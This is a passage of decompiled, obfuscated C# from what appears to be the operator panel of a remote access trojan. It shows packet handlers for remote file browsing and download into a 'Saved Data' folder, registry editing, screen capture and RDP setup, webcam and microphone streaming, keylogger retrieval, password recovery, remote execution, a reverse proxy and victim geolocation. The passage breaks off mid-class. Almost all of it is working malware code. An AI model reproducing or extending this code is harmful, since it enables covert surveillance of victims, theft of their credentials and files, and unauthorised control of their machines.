      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.CreateValuePacket:
        class128.gclass18_0.method_20().newFormSystemManagers_0.vmethod_20().Invoke((Delegate) new Delegate0(class128._Lambda\u0024__103));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RegistryPacket.DeleteValuePacket:
        class128.gclass18_0.method_20().newFormSystemManagers_0.vmethod_20().Invoke((Delegate) new Delegate0(class128._Lambda\u0024__104));
        break;
    }
  }

  public void method_29(GClass18 gclass18_0, object[] object_0)
  {
    if (!this.method_53((Form) gclass18_0.method_20().newFormSystemManagers_0) || (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket) object_0[1] != dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.StartupPacket.Refresh)
      return;
    gclass18_0.method_20().newFormSystemManagers_0.vmethod_22().method_4(object_0);
  }

  private void method_30(GClass18 gclass18_0, object[] object_0)
  {
    if (!gclass18_0.method_20().bool_3 || !this.method_53((Form) gclass18_0.method_20().newFormSystemManagers_0))
      return;
    gclass18_0.method_20().newFormSystemManagers_0.vmethod_24().method_5(object_0);
  }

  public void method_31(GClass18 gclass18_0, object[] object_0)
  {
    if (!this.method_53((Form) gclass18_0.method_20().newFormSystemManagers_0) || (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TcpConnectionPacket) object_0[1] != dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TcpConnectionPacket.Refresh)
      return;
    gclass18_0.method_20().newFormSystemManagers_0.vmethod_26().method_4(object_0);
  }

  private void method_32(GClass18 gclass18_0, object[] object_0)
  {
    if (!this.method_53((Form) gclass18_0.method_20().newFormSystemManagers_0))
      return;
    gclass18_0.method_20().newFormSystemManagers_0.vmethod_28().method_4(object_0);
  }

  private void method_33(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class112 class112 = new GClass21.Class112();
    class112.object_0 = object_0;
    class112.gclass18_0 = gclass18_0;
    if (!this.method_53((Form) class112.gclass18_0.method_20().formFileManager_0))
      return;
    GClass21.Class112.Class113 class113 = new GClass21.Class112.Class113();
    class113.class112_0 = class112;
    class113.formFileManager_0 = class112.gclass18_0.method_20().formFileManager_0;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket) Convert.ChangeType(RuntimeHelpers.GetObjectValue(class112.object_0[1]), typeof (byte)))
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.ListFiles:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__105));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Drives:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__110));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Delete:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__106));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.CreateFolder:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__108));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Rename:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__109));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Thumbnail:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__113));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.SpecialFolder:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__107));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.Search:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__111));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.FileHeaderPacket.SearchUpdate:
        class113.formFileManager_0.Invoke((Delegate) new Delegate0(class113._Lambda\u0024__112));
        break;
    }
  }

  private void method_34(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class123 class123 = new GClass21.Class123();
    class123.object_0 = object_0;
    class123.gclass18_0 = gclass18_0;
    if (!this.method_53((Form) class123.gclass18_0.method_20().formDesktop_0) || class123.gclass18_0.method_20().formDesktop_0 == null)
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket) Convert.ChangeType(RuntimeHelpers.GetObjectValue(class123.object_0[1]), typeof (byte)))
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.Initialize:
        class123.gclass18_0.method_20().gclass18_1 = class123.gclass18_0;
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.SendScreen:
        if (class123.gclass18_0.method_6() | class123.gclass18_0.method_10())
        {
          class123.gclass18_0.method_20().formDesktop_0.Invoke((Delegate) new Delegate0(class123._Lambda\u0024__114));
          break;
        }
        class123.gclass18_0.method_20().formDesktop_0.method_7((byte[]) class123.object_0[2]);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.Disconnect:
        class123.gclass18_0.method_20().formDesktop_0.method_11();
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.Screen:
        class123.gclass18_0.method_20().formDesktop_0.method_8((string) class123.object_0[2]);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.Resize:
        class123.gclass18_0.method_20().formDesktop_0.method_12();
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.DXGISetup:
        class123.gclass18_0.method_20().formDesktop_0.Invoke((Delegate) new Delegate0(class123._Lambda\u0024__115));
        string str = Application.StartupPath + "\\Resources\\";
        dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(class123.gclass18_0, new object[6]
        {
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Desktop,
          (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.DXGISetup,
          (object) File.ReadAllBytes(str + "1.dat"),
          (object) File.ReadAllBytes(str + "2.dat"),
          (object) File.ReadAllBytes(str + "3.dat"),
          (object) File.ReadAllBytes(str + "4.dat")
        });
        break;
    }
  }

  private void method_35(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class115 class115 = new GClass21.Class115();
    class115.gclass18_0 = gclass18_0;
    class115.object_0 = object_0;
    if (!this.method_53((Form) class115.gclass18_0.method_20().formWindowsRDP_0) || class115.gclass18_0.method_20().formWindowsRDP_0 == null)
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket) class115.object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.CheckInstallation:
        class115.gclass18_0.method_20().formWindowsRDP_0.Invoke((Delegate) new Delegate0(class115._Lambda\u0024__116));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.GetUsers:
        class115.gclass18_0.method_20().formWindowsRDP_0.Invoke((Delegate) new Delegate0(class115._Lambda\u0024__117));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.GetArch:
        class115.gclass18_0.method_20().formWindowsRDP_0.method_1(Conversions.ToBoolean(class115.object_0[2]));
        break;
    }
  }

  public void method_36(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class121 class121 = new GClass21.Class121();
    class121.object_0 = object_0;
    class121.gclass18_0 = gclass18_0;
    if (!this.method_53((Form) class121.gclass18_0.method_20().formCamera_0))
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket) class121.object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket.GetDevices:
        class121.gclass18_0.method_20().formCamera_0.Invoke((Delegate) new Delegate0(class121._Lambda\u0024__118));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.WebcamPacket.Image:
        class121.gclass18_0.method_20().formCamera_0.method_0((byte[]) class121.object_0[2]);
        break;
    }
  }

  public void method_37(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class111 class111 = new GClass21.Class111();
    class111.gclass18_0 = gclass18_0;
    class111.object_0 = object_0;
    if (!this.method_53((Form) class111.gclass18_0.method_20().formKeylogger_0))
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket) class111.object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.Refresh:
        class111.gclass18_0.method_20().formKeylogger_0.Invoke((Delegate) new Delegate0(class111._Lambda\u0024__119));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.Download:
        class111.gclass18_0.method_20().formKeylogger_0.Invoke((Delegate) new Delegate0(class111._Lambda\u0024__120));
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.KeyloggerPacket.StartLive:
        class111.gclass18_0.method_20().formKeylogger_0.Invoke((Delegate) new Delegate0(class111._Lambda\u0024__121));
        break;
    }
  }

  public void method_38(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class119 class119 = new GClass21.Class119();
    class119.object_0 = object_0;
    class119.formMicrophone_0 = gclass18_0.method_20().formMicrophone_0;
    if (!this.method_53((Form) class119.formMicrophone_0))
      return;
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MicrophonePacket) class119.object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MicrophonePacket.SendStream:
        class119.formMicrophone_0.method_3((byte[]) class119.object_0[2]);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MicrophonePacket.DeviceList:
        class119.formMicrophone_0.Invoke((Delegate) new Delegate0(class119._Lambda\u0024__122));
        break;
    }
  }

  public void method_39(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class127 class127 = new GClass21.Class127();
    class127.gclass18_0 = gclass18_0;
    class127.object_0 = object_0;
    if (!this.method_53((Form) class127.gclass18_0.method_20().formPassword_0) || (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PasswordRecoveryPacket) class127.object_0[1] != dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PasswordRecoveryPacket.Refresh)
      return;
    class127.gclass18_0.method_20().formPassword_0.Invoke((Delegate) new Delegate0(class127._Lambda\u0024__123));
  }

  private void method_40(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class130 class130 = new GClass21.Class130();
    class130.gclass18_0 = gclass18_0;
    class130.object_0 = object_0;
    if (!this.method_53((Form) class130.gclass18_0.method_20().formExecuteUpdate_0) || (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ExecutePacket) class130.object_0[1] != dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ExecutePacket.UpdateProgress || class130.gclass18_0.method_20().formExecuteUpdate_0 == null)
      return;
    class130.gclass18_0.method_20().formExecuteUpdate_0.Invoke((Delegate) new Delegate0(class130._Lambda\u0024__124));
  }

  private void method_41(GClass18 gclass18_0, object[] object_0)
  {
    GClass21.Class120 class120 = new GClass21.Class120();
    class120.object_0 = object_0;
    class120.gclass18_0 = gclass18_0;
    if (!this.method_53((Form) class120.gclass18_0.method_20().formChat_0) || (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ChatHeaderPacket) class120.object_0[1] != dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ChatHeaderPacket.Message)
      return;
    class120.gclass18_0.method_20().formChat_0.Invoke((Delegate) new Delegate0(class120._Lambda\u0024__125));
  }

  private void method_42(GClass18 gclass18_0, object[] object_0)
  {
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket) object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket.ReverseProxyData:
        gclass18_0.method_20().gclass27_0.method_9(Conversions.ToInteger(object_0[2]))?.method_17((byte[]) object_0[3]);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket.ReverseProxyConnectResponse:
        gclass18_0.method_20().gclass27_0.method_9(Conversions.ToInteger(object_0[2]))?.method_21(Conversions.ToInteger(object_0[2]), Conversions.ToBoolean(object_0[3]), Conversions.ToLong(object_0[4]), Conversions.ToInteger(object_0[5]), (string) object_0[6]);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProxyPacket.ReverseProxyDisconnect:
        gclass18_0.method_20().gclass27_0.method_9(Conversions.ToInteger(object_0[2]))?.method_16();
        break;
    }
  }

  private void method_43(GClass18 gclass18_0, object[] object_0)
  {
    GClass18 gclass18_1 = this.method_57(gclass18_0.method_20().string_0);
    FormFileManager formFileManager0 = gclass18_0.method_20().formFileManager_0;
    int int0 = gclass18_1.method_20().int_0;
    string string_0 = gclass18_1.method_20().method_0();
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader) object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.FileInfo:
        this.method_44(formFileManager0, gclass18_0, gclass18_1, object_0);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.DataChunk:
        this.method_45(gclass18_0, int0, string_0, formFileManager0, object_0);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.RequestNext:
        this.method_46(int0, formFileManager0, gclass18_0, object_0);
        break;
    }
  }

  private void method_44(
    FormFileManager formFileManager_0,
    GClass18 gclass18_0,
    GClass18 gclass18_1,
    object[] object_0)
  {
    string string_0 = (string) object_0[3];
    gclass18_0.method_20().string_0 = string_0;
    gclass18_1.method_20().gclass18_3 = this.method_58(string_0);
    gclass18_1.method_20().gclass18_3.method_20().gclass18_0 = gclass18_0;
    gclass18_0.method_20().long_2 = Conversions.ToLong(object_0[5]);
    formFileManager_0.method_49((string) object_0[2], (string) object_0[4]);
  }

  private void method_45(
    GClass18 gclass18_0,
    int int_0,
    string string_0,
    FormFileManager formFileManager_0,
    object[] object_0)
  {
    GClass21.Class116 class116 = new GClass21.Class116();
    class116.formFileManager_0 = formFileManager_0;
    class116.object_0 = object_0;
    class116.gclass21_0 = this;
    class116.gclass18_0 = gclass18_0;
    class116.int_0 = int_0;
    byte[] byte_1 = (byte[]) class116.object_0[2];
    string string_3 = (string) class116.object_0[3];
    class116.gclass18_0.method_20().gclass18_0.method_20().long_1 += (long) byte_1.Length;
    this.method_47("Downloads", "Saved Data", string_0, string_3, byte_1);
    if ((int) class116.object_0[6] + 1 == (int) class116.object_0[8])
    {
      class116.formFileManager_0.Invoke((Delegate) new Delegate0(class116._Lambda\u0024__126));
    }
    else
    {
      if (class116.gclass18_0.method_20().gclass18_0.method_20().bool_2)
        class116.gclass18_0.method_20().gclass18_0.method_20().bool_2 = false;
      class116.formFileManager_0.Invoke((Delegate) new Delegate0(class116._Lambda\u0024__127));
    }
  }

  private void method_46(
    int int_0,
    FormFileManager formFileManager_0,
    GClass18 gclass18_0,
    object[] object_0)
  {
    GClass21.Class122 class122 = new GClass21.Class122();
    class122.int_0 = int_0;
    class122.gclass18_0 = gclass18_0;
    class122.formFileManager_0 = formFileManager_0;
    class122.gclass21_0 = this;
    this.long_1 = 0L;
    this.long_0 = 0L;
    object Left = object_0[2];
    if (Operators.ConditionalCompareObjectEqual(Left, (object) 1, false))
    {
      class122.formFileManager_0.Invoke((Delegate) new Delegate0(class122._Lambda\u0024__128));
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(class122.gclass18_0, new object[1]
      {
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.TransferHeader.RequestNext
      });
    }
    else
    {
      if (!Operators.ConditionalCompareObjectEqual(Left, (object) 0, false))
        return;
      class122.formFileManager_0.Invoke((Delegate) new Delegate0(class122._Lambda\u0024__129));
      class122.formFileManager_0.Invoke((Delegate) new Delegate0(class122._Lambda\u0024__130));
      if (class122.gclass18_0.method_12())
      {
        class122.gclass18_0.method_20().gclass18_3.method_32();
        Class97.list_0.Remove(class122.gclass18_0.method_20().gclass18_3);
      }
      else
      {
        class122.gclass18_0.method_32();
        Class97.list_0.Remove(class122.gclass18_0);
      }
    }
  }

  private void method_47(
    string string_0,
    string string_1,
    string string_2,
    string string_3,
    byte[] byte_1)
  {
    if (!Directory.Exists(string_1))
      Directory.CreateDirectory(string_1);
    if (!Directory.Exists(Application.StartupPath + "\\" + string_1 + "\\" + string_0 + "\\" + string_2 + "\\"))
      Directory.CreateDirectory(Application.StartupPath + "\\" + string_1 + "\\" + string_0 + "\\" + string_2 + "\\");
    this.method_48(Application.StartupPath + "\\" + string_1 + "\\" + string_0 + "\\" + string_2 + "\\" + string_3, byte_1);
  }

  public void method_48(string string_0, byte[] byte_1)
  {
    FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
    fileStream.Write(byte_1, 0, byte_1.Length);
    fileStream.Close();
  }

  private void method_49(
    GClass18 gclass18_0,
    FormFileManager formFileManager_0,
    ListView listView_0,
    int int_0)
  {
    listView_0.Items[int_0].SubItems[2].Text = "100%";
    listView_0.Items[int_0].SubItems[3].Text = "Finished";
    listView_0.Items[int_0].SubItems[4].Text = "Finished";
    gclass18_0.method_20().gclass18_0.method_20().bool_2 = true;
    gclass18_0.method_20().gclass18_0.method_20().long_1 = 0L;
    gclass18_0.method_20().gclass18_0.method_20().long_0 = 0L;
    gclass18_0.method_20().gclass18_0.method_20().long_2 = 0L;
  }

  private void method_50(GClass18 gclass18_0, object[] object_0)
  {
    switch ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket) object_0[1])
    {
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket.Create:
        this.method_51(gclass18_0, object_0);
        break;
      case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ThumbnailPacket.Update:
        this.method_52(gclass18_0.method_20().userControlThumbnail_0, object_0);
        break;
    }
  }

  private void method_51(GClass18 gclass18_0, object[] object_0)
  {
    Bitmap bitmap_0 = (Bitmap) Class97.smethod_18((byte[]) object_0[2]);
    Class97.formMain_0.vmethod_18().method_5(gclass18_0, bitmap_0);
  }

  private void method_52(UserControlThumbnail userControlThumbnail_0, object[] object_0)
  {
    Bitmap bitmap_0 = (Bitmap) Class97.smethod_18((byte[]) object_0[2]);
    Class97.formMain_0.vmethod_18().method_6(userControlThumbnail_0, bitmap_0);
  }

  private bool method_53(Form form_0) => form_0 != null && form_0.IsHandleCreated;

  private bool method_54(UserControl userControl_0) => userControl_0 != null && userControl_0.IsHandleCreated;

  public string method_55(string string_0)
  {
    string str;
    try
    {
      if (Operators.CompareString(string_0, "127.0.0.1", false) == 0)
      {
        str = "0";
      }
      else
      {
        string empty = string.Empty;
        string Left = Class97.generalSettings_0.GeoIPSetting != 0 ? this.gclass11_0.method_2(string_0) : this.gclass11_0.method_1(string_0);
        str = Operators.CompareString(Left, string.Empty, false) == 0 ? "0" : Left;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = "0";
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public bool method_56(string string_0)
  {
    bool flag;
    try
    {
      lock (Class97.list_0)
      {
        try
        {
          foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
          {
            if (Operators.CompareString(gclass18.method_20().string_0, string_0, false) == 0)
            {
              flag = true;
              goto label_25;
            }
          }
        }
        finally
        {
          List<GClass18>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
      try
      {
        foreach (GClass30 gclass30 in Class97.list_1)
        {
          lock (gclass30.method_16())
          {
            try
            {
              foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) gclass30.method_16()))
              {
                if (Operators.CompareString(gclass18.method_20().string_0, string_0, false) == 0)
                {
                  flag = true;
                  goto label_25;
                }
              }
            }
            finally
            {
              List<GClass18>.Enumerator enumerator;
              enumerator.Dispose();
            }
          }
        }
      }
      finally
      {
        List<GClass30>.Enumerator enumerator;
        enumerator.Dispose();
      }
      flag = false;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
label_25:
    return flag;
  }

  public GClass18 method_57(string string_0)
  {
    lock (Class97.list_0)
    {
      try
      {
        foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
        {
          if (gclass18.method_20().bool_0 && Operators.CompareString(gclass18.method_20().string_0, string_0, false) == 0)
            return gclass18;
        }
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    try
    {
      foreach (GClass30 gclass30 in Class97.list_1)
      {
        lock (gclass30.method_16())
        {
          try
          {
            foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) gclass30.method_16()))
            {
              if (gclass18.method_20().bool_0 && Operators.CompareString(gclass18.method_20().string_0, string_0, false) == 0)
                return gclass18;
            }
          }
          finally
          {
            List<GClass18>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
    }
    finally
    {
      List<GClass30>.Enumerator enumerator;
      enumerator.Dispose();
    }
    GC.Collect();
    return (GClass18) null;
  }

  public GClass18 method_58(string string_0)
  {
    lock (Class97.list_0)
    {
      try
      {
        foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
        {
          if (gclass18.method_20().connectionSocketPacket_0 == dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.FileTransferSocket && Operators.CompareString(gclass18.method_20().string_0, string_0, false) == 0)
            return gclass18;
        }
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    try
    {
      foreach (GClass30 gclass30 in Class97.list_1)
      {
        lock (gclass30.method_16())
        {
          try
          {
            foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) gclass30.method_16()))
            {
              if (gclass18.method_20().connectionSocketPacket_0 == dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket.FileTransferSocket && Operators.CompareString(gclass18.method_20().string_0, string_0, false) == 0)
                return gclass18;
            }
          }
          finally
          {
            List<GClass18>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
    }
    finally
    {
      List<GClass30>.Enumerator enumerator;
      enumerator.Dispose();
    }
    GC.Collect();
    return (GClass18) null;
  }

  public GClass18 method_59(string string_0)
  {
    lock (Class97.list_0)
    {
      try
      {
        foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
        {
          if (Operators.CompareString(gclass18.method_20().string_0, string_0, false) == 0)
            return gclass18;
        }
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
    }
    try
    {
      foreach (GClass30 gclass30 in Class97.list_1)
      {
        lock (gclass30.method_16())
        {
          try
          {
            foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) gclass30.method_16()))
            {
              if (Operators.CompareString(gclass18.method_20().string_0, string_0, false) == 0)
                return gclass18;
            }
          }
          finally
          {
            List<GClass18>.Enumerator enumerator;
            enumerator.Dispose();
          }
        }
      }
    }
    finally
    {
      List<GClass30>.Enumerator enumerator;
      enumerator.Dispose();
    }
    GC.Collect();
    return (GClass18) null;
  }

  public string method_60(long long_3)
  {
    string[] strArray = new string[4]
    {
      "B",
      "KB",
      "MB",
      "GB"
    };
    Decimal d1 = new Decimal(long_3);
    int index = 0;
    while (Decimal.Compare(d1, 1024M) > 0)
    {
      d1 = Decimal.Round(Decimal.Divide(d1, 1024M), 2);
      ++index;
      if (index >= strArray.Length - 1)
        break;
    }
    return d1.ToString() + " " + strArray[index];
  }

  public void method_61()
  {
    object[] object_3 = new object[1]{ (object) this };
    Class86.smethod_0().method_68(Class86.smethod_1(), "&iPo:Pa.Q$", object_3);
  }

  public byte[] method_62(string[] string_0)
  {
    List<byte> byteList = new List<byte>();
    int num = string_0.Length - 1;
    for (int index = 0; index <= num; ++index)
      byteList.Add(Conversions.ToByte(string_0[index]));
    return byteList.ToArray();
  }

  private void method_63(string string_0)
  {
    object[] object_3 = new object[2]
    {
      (object) this,
      (object) string_0
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "YU#BqPa.Q$", object_3);
  }

  internal sealed class Class111
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__119() => this.gclass18_0.method_20().formKeylogger_0.method_5(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__120() => this.gclass18_0.method_20().formKeylogger_0.method_7(this.object_0);

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__121() => this.gclass18_0.method_20().formKeylogger_0.method_9(this.object_0);
  }

  internal sealed class Class112
  {
    public GClass18 gclass18_0;
    public object[] object_0;

    internal sealed class Class113
    {
      public FormFileManager formFileManager_0;
      public GClass21.Class112 class112_0;

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__105() => this.formFileManager_0.method_24(this.class112_0.object_0);

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__106() => this.formFileManager_0.method_26(this.class112_0.object_0);

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__107() => this.formFileManager_0.method_25(this.class112_0.object_0);

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__108() => this.formFileManager_0.method_27(this.class112_0.object_0);

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__109() => this.formFileManager_0.method_28(this.class112_0.object_0);

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__110() => this.formFileManager_0.method_23(this.class112_0.object_0);

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__111() => this.formFileManager_0.method_29(this.class112_0.object_0);

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__112() => this.formFileManager_0.method_30(this.class112_0.object_0);

      [CompilerGenerated]
      [SpecialName]
      public void _Lambda\u0024__113() => this.formFileManager_0.method_31(this.class112_0.gclass18_0, this.class112_0.object_0);
    }
  }

  internal sealed class Class114
  {
    public GClass18 gclass18_0;
    public GClass21 gclass21_0;

